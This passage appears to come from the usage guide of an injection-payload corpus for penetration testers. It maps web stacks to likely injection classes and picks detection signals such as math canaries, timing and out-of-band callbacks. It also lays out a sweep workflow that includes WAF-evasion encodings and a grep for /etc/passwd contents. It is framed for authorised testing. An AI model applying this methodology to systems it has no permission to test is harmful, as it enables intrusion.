| Java stack (`JSESSIONID`, `.action`, Spring error) | EL Injection, Deserialization (Java), SSTI (Freemarker/Velocity/Thymeleaf) | Log4Shell | math, OOB |
| Node stack (`connect.sid`, Express error) | Prototype Pollution, NoSQL (Mongo), SSTI (EJS/Pug/Nunjucks), Deserialization (node-serialize) | - | math, OOB |
| Python stack (Flask/Django) | SSTI (Jinja2), Deserialization (pickle/YAML), Path Traversal | SQLi | math, timing, OOB |
| PHP stack | SQLi, SSTI (Twig/Smarty), Deserialization (unserialize/phar), PHP wrappers via Path Traversal | OS Cmd | math, file-read |
| Ruby / Rails (`_session`) | SSTI (ERB/Slim/Haml), Deserialization (YAML/Marshal) | SQLi | math, OOB |
| .NET (`.aspx`, `ViewState`) | Deserialization (LosFormatter/BinaryFormatter/Json.NET), SSTI (Razor) | SQLi (MSSQL) | error, OOB |
| Jenkins/Confluence/Jira banner | Code Injection (Groovy), Deserialization (Java), EL Injection | Log4Shell | math, OOB |
| Graph-backed UI | Cypher | - | error, timing |
| Full-text search UI with facets | Elasticsearch, SQLi | - | error, math |
| App fetches a user-supplied URL and returns content | SSRF, CRLF | XXE (if response is XML) | OOB |
| Generic reflected string | XSS, Polyglots, Format String | SSTI | reflected, math |

---

## 5. Pillar Selection - Pick Before You Fire

You must be able to **observe** the signal you're testing for. Picking the wrong pillar means silent false negatives.

| Pillar | Observe via | Pick when |
|---|---|---|
| **Error** (324) | Grep response body for exception / stack trace / parser error text | Response is visible and the app leaks errors |
| **Math** (`1337`) (182) | Grep response body for `1337` | Response is visible, errors suppressed |
| **Timing** (>4.5s) (227) | Wall-clock the request | Blind, no response body |
| **OOB** (209) | Your oastify/interactsh/collaborator listener | Blind or async; always preferred if you have a callback |
| **Reflected** (374) | View the rendered page (usually as another user/session) | XSS, CRLF, format string probes |
| **File-read** | Grep response for `root:x:` / `[extensions]` | Path traversal, XXE, XSLT `document()` |

**Rule of thumb:**
1. Prefer **OOB** if you have a listener - it works blind and survives sanitization.
2. Else prefer **math** (`1337`) - cleaner than error-grepping and provably server-side.
3. Else **timing** - slowest signal but survives total output suppression.
4. **Error** as a secondary / confirmation signal, not primary.
5. **Reflected** only when you *know* you can view the output.

---

## 6. Workflow

```text
1. Fingerprint stack (headers, cookies, errors, paths, JS) and DB.
   ↓
2. Profile each parameter: what does the app do with it?
   ↓
3. Consult the Selection Matrix → candidate categories.
   ↓
4. Pick observable pillar (OOB > math > timing > error > reflected).
   ↓
5. If OOB: ./tools/payloadctl prepare <callback-domain>
   ↓
6. First sweep - ALL params, minimal list:
      ready/minimal/payloads-only.txt  (83 payloads)
   ↓
7. Any hit? Narrow to that category and run:
      ready/full/by-category/<cat>.txt
   ↓
8. No hit? Run category-specific file based on fingerprint.
   ↓
9. WAF blocking? Switch to encoded variants:
      ready/full/encoded/{url-encoded,base64,json-safe,
                         double-url-encoded,html-entity,
                         hex-escaped,unicode-escaped}/payloads.txt
   ↓
10. Confirm signal. Document. Escalate per ROE.
```

### Do
- Start with the **minimal list** (83 payloads) at every parameter - covers all 20 categories with at least one pillar each, and one sweep will flag where to dig deeper.
- **Prepare once per engagement** with your callback domain. Don't leak someone else's domain by accident.
- **Match encoding to transport**: JSON body → `json-safe`, query param → `url-encoded`, WAF suspected → `double-url-encoded`.
- **Watch pillars you can observe.** Writing an OOB payload with no listener is wasted work.

### Don't
- Don't throw all 1,353 payloads at every param blindly - you'll burn the target's WAF budget and miss signals in noise.
- Don't assume the category from the UI alone; fingerprint the backend.
- Don't trust "no error" as "no vulnerability" - use timing and OOB to cover blind cases.
- Don't rely on `curl`/`nslookup`-based payloads if you suspect a restricted container. This corpus prefers language built-ins for a reason; stick with them.
- Don't use file-read payloads against targets where reading real files would constitute a data breach under your ROE. Use `math` / OOB-to-your-own-host instead.

---

## 7. Quick Reference

- **Minimal first-pass list**: `ready/minimal/payloads-only.txt` - 83 payloads, all 20 categories, all pillars where architecturally possible.
- **Full list**: `ready/full/payloads-only.txt` - 1,353 payloads.
- **By category**: `ready/full/by-category/<cat>.txt` (20 files).
- **By pillar**: `ready/full/by-pillar/{error,math,timing,oob,reflected}-payloads-only.txt`.
- **Encoded**: `ready/full/encoded/<encoding>/payloads.txt` (7 encodings).
- **Canary values**: `1337` (primary, from `7*191`), `7331` (secondary).
- **Per-engine pillar tables + syntax**: `SPEC.md`.
- **Placeholders**: `{domain}` in raw templates - substituted by `payloadctl prepare`.

---

## 8. When *not* to use this corpus

- Target is out of scope or ROE forbids active injection.
- You have no observation channel (no response body, no OOB listener, no timing visibility). Firing payloads blind with no validation of impact is noise, not testing.
- Production systems handling real user data where even read-only PoC (file-read, data dumps) could constitute a breach. Use `math` and OOB-to-your-own-host only.
- Rate-limited or contractually throttled targets - use the 83-payload minimal list, not the full 1,353.
